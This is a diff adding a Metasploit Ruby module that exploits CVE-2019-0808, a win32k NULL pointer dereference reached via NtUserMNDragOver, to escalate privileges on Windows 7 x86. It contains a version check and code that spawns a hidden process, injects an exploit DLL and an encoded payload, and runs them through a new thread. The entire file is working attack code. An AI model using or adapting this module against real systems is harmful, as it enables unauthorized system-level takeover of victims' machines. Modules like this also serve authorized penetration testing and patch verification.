@@ -1,0 +1,132 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core/post/file'
+require 'msf/core/exploit/exe'
+require 'msf/core/post/windows/priv'
+
+class MetasploitModule < Msf::Exploit::Local
+  Rank = NormalRanking
+
+  include Msf::Post::File
+  include Msf::Exploit::EXE
+  include Msf::Post::Windows::Priv
+  include Msf::Post::Windows::FileInfo
+  include Msf::Post::Windows::ReflectiveDLLInjection
+  include Msf::Exploit::Remote::AutoCheck
+
+  def initialize(info = {})
+    super(
+        update_info(
+            info,
+            'Name' => 'Microsoft Windows NtUserMNDragOver Local Privilege Elevation',
+            'Description' => %q{
+               This module exploits a NULL pointer dereference vulnerability in
+               MNGetpItemFromIndex(), which is reachable via a NtUserMNDragOver() system call.
+
+               The NULL pointer dereference occurs because the xxxMNFindWindowFromPoint()
+               function does not effectively check the validity of the tagPOPUPMENU
+               objects it processes before passing them on to MNGetpItemFromIndex(),
+               where the NULL pointer dereference will occur.
+
+               This module has been tested against Windows 7 x86 SP0 and SP1. Offsets
+               within the solution may need to be adjusted to work with other versions
+               of Windows, such as Windows Server 2008.
+        },
+            'License' => MSF_LICENSE,
+            'Author' =>
+                [
+                    'Clément Lecigne', # discovery
+                    'Grant Willcox', # exploit
+                    'timwr' # msf module
+                ],
+            'Platform' => 'win',
+            'SessionTypes' => ['meterpreter'],
+            'Targets' =>
+                [
+                    ['Windows 7 x86', { 'Arch' => ARCH_X86 }]
+                ],
+            'SideEffects' => [SCREEN_EFFECTS],
+            'References' =>
+                [
+                    ['CVE', '2019-0808'],
+                    ['URL', 'https://github.com/exodusintel/CVE-2019-0808'],
+                    ['URL', 'https://github.com/ze0r/cve-2019-0808-poc'],
+                    ['URL', 'http://blogs.360.cn/post/RootCause_CVE-2019-0808_EN.html'],
+                    ['URL', 'https://blog.exodusintel.com/2019/05/17/windows-within-windows/'],
+                ],
+            'DisclosureDate' => 'Mar 12 2019',
+            'DefaultTarget' => 0
+        )
+    )
+    register_options([
+                         OptString.new('PROCESS', [true, 'Name of process to spawn and inject dll into.', 'notepad.exe'])
+                     ])
+  end
+
+  def setup_process
+    process_name = datastore['PROCESS']
+    begin
+      print_status("Launching #{process_name} to host the exploit...")
+      launch_process = client.sys.process.execute(process_name, nil, 'Hidden' => true)
+      process = client.sys.process.open(launch_process.pid, PROCESS_ALL_ACCESS)
+      print_good("Process #{process.pid} launched.")
+    rescue Rex::Post::Meterpreter::RequestError
+      # Sandboxes could not allow to create a new process
+      # stdapi_sys_process_execute: Operation failed: Access is denied.
+      print_error('Operation failed. Trying to elevate the current process...')
+      process = client.sys.process.open
+    end
+    process
+  end
+
+  def check
+    sysinfo_value = sysinfo['OS']
+
+    if sysinfo_value !~ /windows/i
+      # Non-Windows systems are definitely not affected.
+      return CheckCode::Safe
+    end
+
+    build_num = sysinfo_value.match(/\w+\d+\w+(\d+)/)[0].to_i
+    vprint_status("Windows Build Number = #{build_num}")
+    # see https://docs.microsoft.com/en-us/windows/release-information/
+    unless sysinfo_value =~ /7/ && (build_num >= 7600 && build_num <= 7601)
+      print_error('The exploit only supports Windows 7 versions 7600 and 7601')
+      return CheckCode::Safe
+    end
+
+    path = expand_path('%WINDIR%\\system32\\win32k.sys')
+    major, minor, build, revision, brand = file_version(path)
+    return CheckCode::Safe if revision >= 24387
+
+    CheckCode::Appears
+  end
+
+  def exploit
+    super
+
+    if is_system?
+      fail_with(Failure::None, 'Session is already elevated')
+    end
+
+    if sysinfo['Architecture'] != ARCH_X86
+      fail_with(Failure::NoTarget, 'Running against 64-bit systems is not supported')
+    end
+
+    process = setup_process
+    library_data = exploit_data('CVE-2019-0808', 'exploit.dll')
+    print_status("Injecting exploit into #{process.pid} ...")
+    exploit_mem, offset = inject_dll_data_into_process(process, library_data)
+    print_status("Exploit injected. Injecting payload into #{process.pid}...")
+    encoded_payload = payload.encoded
+    payload_mem = inject_into_process(process, [encoded_payload.length].pack('I<') + encoded_payload)
+
+    # invoke the exploit, passing in the address of the payload that
+    # we want invoked on successful exploitation.
+    print_status('Payload injected. Executing exploit...')
+    process.thread.create(exploit_mem + offset, payload_mem)
+  end
+end
